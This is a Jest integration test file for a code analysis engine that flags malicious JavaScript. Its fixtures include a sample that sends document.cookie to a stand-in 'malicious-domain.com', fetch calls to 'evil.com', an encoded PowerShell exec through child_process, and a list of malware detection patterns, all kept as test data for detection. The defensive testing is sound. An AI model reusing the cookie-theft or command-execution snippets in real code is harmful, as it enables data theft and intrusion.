import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { analysisEngine } from '../../bridge';
import { FileAnalysisResult, AnalysisError, VulnerabilitySeverity } from '../../bridge/types';
import * as fs from 'fs/promises';
import * as path from 'path';

describe('Analysis Engine Integration Tests', () => {
  let testBuffer: ArrayBuffer;
  let maliciousBuffer: ArrayBuffer;
  let largeBuffer: ArrayBuffer;

  beforeAll(async () => {
    // Create test data
    const encoder = new TextEncoder();
    
    // Benign JavaScript code
    const benignCode = `
      function calculateTotal(items) {
        return items.reduce((sum, item) => sum + item.price, 0);
      }
      console.log("Hello World");
    `;
    testBuffer = encoder.encode(benignCode).buffer;

    // Malicious JavaScript with patterns
    const maliciousCode = `
      eval(atob("ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+Iik="));
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "http://malicious-domain.com/steal-data");
      xhr.send(document.cookie);
      
      // Obfuscated code
      var _0x1234 = ["\x48\x65\x6c\x6c\x6f", "\x57\x6f\x72\x6c\x64"];
      function _0xabcd(_0x5678) { return _0x1234[_0x5678]; }
      
      // Suspicious patterns
      var cmd = "powershell.exe -encodedCommand " + btoa("Get-Process");
      require('child_process').exec(cmd);
    `;
    maliciousBuffer = encoder.encode(maliciousCode).buffer;

    // Large buffer for performance testing
    const largeCode = benignCode.repeat(10000);
    largeBuffer = encoder.encode(largeCode).buffer;
  });

  describe('Basic Functionality', () => {
    test('should successfully analyze benign code', async () => {
      const result = await analysisEngine.analyzeBuffer(testBuffer);
      
      expect(result).toBeDefined();
      expect(result.vulnerabilities).toHaveLength(0);
      expect(result.hash).toBeDefined();
      expect(result.hash).toMatch(/^[a-f0-9]{64}$/); // SHA256 format
      expect(result.analysis_time_ms).toBeGreaterThan(0);
      expect(result.file_size).toBe(testBuffer.byteLength);
    });

    test('should detect malicious patterns', async () => {
      const result = await analysisEngine.analyzeBuffer(maliciousBuffer);
      
      expect(result.vulnerabilities.length).toBeGreaterThan(0);
      
      // Check for eval detection
      const evalVuln = result.vulnerabilities.find(v => 
        v.description.toLowerCase().includes('eval')
      );
      expect(evalVuln).toBeDefined();
      expect(evalVuln?.severity).toBe(VulnerabilitySeverity.High);
      
      // Check for suspicious domain
      const domainVuln = result.vulnerabilities.find(v => 
        v.description.includes('malicious-domain.com')
      );
      expect(domainVuln).toBeDefined();
      
      // Check for obfuscation detection
      const obfuscationVuln = result.vulnerabilities.find(v => 
        v.category === 'obfuscation'
      );
      expect(obfuscationVuln).toBeDefined();
    });

    test('should handle empty buffer', async () => {
      const emptyBuffer = new ArrayBuffer(0);
      const result = await analysisEngine.analyzeBuffer(emptyBuffer);
      
      expect(result.vulnerabilities).toHaveLength(0);
      expect(result.file_size).toBe(0);
    });

    test('should handle large files efficiently', async () => {
      const startTime = Date.now();
      const result = await analysisEngine.analyzeBuffer(largeBuffer);
      const executionTime = Date.now() - startTime;
      
      expect(result).toBeDefined();
      expect(executionTime).toBeLessThan(5000); // Should complete in under 5 seconds
      expect(result.file_size).toBe(largeBuffer.byteLength);
    });
  });

  describe('Deobfuscation Features', () => {
    test('should deobfuscate base64 encoded strings', async () => {
      const code = `var secret = atob("SGVsbG8gV29ybGQ=");`;
      const buffer = new TextEncoder().encode(code).buffer;
      
      const result = await analysisEngine.analyzeBuffer(buffer);
      
      // Should detect the base64 string
      const base64Vuln = result.vulnerabilities.find(v => 
        v.description.includes('Base64')
      );
      expect(base64Vuln).toBeDefined();
      
      // Deobfuscated content should reveal "Hello World"
      expect(base64Vuln?.details).toContain('Hello World');
    });

    test('should detect hex encoded strings', async () => {
      const code = `var data = "\\x48\\x65\\x6c\\x6c\\x6f";`;
      const buffer = new TextEncoder().encode(code).buffer;
      
      const result = await analysisEngine.analyzeBuffer(buffer);
      
      const hexVuln = result.vulnerabilities.find(v => 
        v.category === 'obfuscation' && v.description.includes('Hex')
      );
      expect(hexVuln).toBeDefined();
    });

    test('should handle unicode escape sequences', async () => {
      const code = `var text = "\\u0048\\u0065\\u006c\\u006c\\u006f";`;
      const buffer = new TextEncoder().encode(code).buffer;
      
      const result = await analysisEngine.analyzeBuffer(buffer);
      
      const unicodeVuln = result.vulnerabilities.find(v => 
        v.category === 'obfuscation'
      );
      expect(unicodeVuln).toBeDefined();
    });
  });

  describe('Pattern Matching', () => {
    test('should detect malware signatures', async () => {
      const patterns = [
        'document.write("<script',
        'XMLHttpRequest',
        'child_process',
        'powershell.exe',
        'cmd.exe',
        'eval(',
        'Function(',
        'setTimeout(',
        'setInterval(',
      ];

      for (const pattern of patterns) {
        const code = `malicious.${pattern}("payload");`;
        const buffer = new TextEncoder().encode(code).buffer;
        const result = await analysisEngine.analyzeBuffer(buffer);
        
        expect(result.vulnerabilities.length).toBeGreaterThan(0);
        expect(result.vulnerabilities.some(v => 
          v.description.includes(pattern) || 
          v.category === 'malware'
        )).toBe(true);
      }
    });

    test('should detect suspicious URLs and IPs', async () => {
      const code = `
        fetch("http://192.168.1.1/payload.js");
        fetch("https://suspicious-site.tk/malware");
        window.location = "http://evil.com/redirect";
      `;
      const buffer = new TextEncoder().encode(code).buffer;
      
      const result = await analysisEngine.analyzeBuffer(buffer);
      
      // Should detect IP address
      expect(result.vulnerabilities.some(v => 
        v.description.includes('192.168.1.1')
      )).toBe(true);
      
      // Should detect suspicious domains
      expect(result.vulnerabilities.some(v => 
        v.description.includes('suspicious-site.tk') ||
        v.description.includes('evil.com')
      )).toBe(true);
    });
  });

  describe('Error Handling', () => {
    test('should handle invalid input gracefully', async () => {
      // Test with non-ArrayBuffer input
      await expect(analysisEngine.analyzeBuffer(null as any))
        .rejects.toThrow();
      
      await expect(analysisEngine.analyzeBuffer(undefined as any))
        .rejects.toThrow();
      
      await expect(analysisEngine.analyzeBuffer("string" as any))
        .rejects.toThrow();
    });

    test('should handle corrupted data', async () => {
      // Create buffer with random bytes
      const corruptedBuffer = new ArrayBuffer(1000);
      const view = new Uint8Array(corruptedBuffer);
      for (let i = 0; i < view.length; i++) {
        view[i] = Math.floor(Math.random() * 256);
      }
      
      // Should not crash, but complete analysis
      const result = await analysisEngine.analyzeBuffer(corruptedBuffer);
      expect(result).toBeDefined();
      expect(result.file_size).toBe(1000);
    });
  });

  describe('Performance Benchmarks', () => {
    test('should meet throughput targets', async () => {
      const sizes = [1024, 10240, 102400, 1024000]; // 1KB, 10KB, 100KB, 1MB
      const results: { size: number; time: number; throughput: number }[] = [];

      for (const size of sizes) {
        const buffer = new ArrayBuffer(size);
        const view = new Uint8Array(buffer);
        // Fill with realistic data
        for (let i = 0; i < size; i++) {
          view[i] = 65 + (i % 26); // A-Z pattern
        }

        const startTime = performance.now();
        await analysisEngine.analyzeBuffer(buffer);
        const endTime = performance.now();
        
        const time = endTime - startTime;
        const throughput = (size / 1024 / 1024) / (time / 1000); // MB/s
        
        results.push({ size, time, throughput });
      }

      // Log performance results
      console.log('Performance Benchmark Results:');
      results.forEach(r => {
        console.log(`Size: ${r.size} bytes, Time: ${r.time.toFixed(2)}ms, Throughput: ${r.throughput.toFixed(2)} MB/s`);
      });

      // Check that larger files have reasonable throughput
      const largeThroughput = results[results.length - 1].throughput;
      expect(largeThroughput).toBeGreaterThan(10); // At least 10 MB/s
    });
  });

  describe('Integration with TypeScript Types', () => {
    test('should return properly typed results', async () => {
      const result = await analysisEngine.analyzeBuffer(testBuffer);
      
      // Type checks (TypeScript will validate at compile time)
      const hash: string = result.hash;
      const size: number = result.file_size;
      const time: number = result.analysis_time_ms;
      const vulns: FileAnalysisResult['vulnerabilities'] = result.vulnerabilities;
      
      expect(typeof hash).toBe('string');
      expect(typeof size).toBe('number');
      expect(typeof time).toBe('number');
      expect(Array.isArray(vulns)).toBe(true);
    });

    test('should handle all severity levels', async () => {
      const severities = Object.values(VulnerabilitySeverity);
      
      // Our malicious buffer should have multiple severity levels
      const result = await analysisEngine.analyzeBuffer(maliciousBuffer);
      
      const foundSeverities = new Set(
        result.vulnerabilities.map(v => v.severity)
      );
      
      expect(foundSeverities.size).toBeGreaterThan(0);
      foundSeverities.forEach(sev => {
        expect(severities).toContain(sev);
      });
    });
  });

  describe('Memory Management', () => {
    test('should not leak memory on repeated analyses', async () => {
      const iterations = 100;
      const buffer = new ArrayBuffer(10240); // 10KB
      
      // Warm up
      await analysisEngine.analyzeBuffer(buffer);
      
      // Get initial memory (if available)
      const initialMemory = (performance as any).memory?.usedJSHeapSize;
      
      // Run many iterations
      for (let i = 0; i < iterations; i++) {
        await analysisEngine.analyzeBuffer(buffer);
      }
      
      // Check memory hasn't grown significantly
      const finalMemory = (performance as any).memory?.usedJSHeapSize;
      
      if (initialMemory && finalMemory) {
        const growth = finalMemory - initialMemory;
        const growthMB = growth / 1024 / 1024;
        console.log(`Memory growth after ${iterations} iterations: ${growthMB.toFixed(2)} MB`);
        
        // Should not grow more than 50MB for 100 iterations
        expect(growthMB).toBeLessThan(50);
      }
    });
  });
});

// Run the tests
if (require.main === module) {
  console.log('Running Analysis Engine Integration Tests...');
}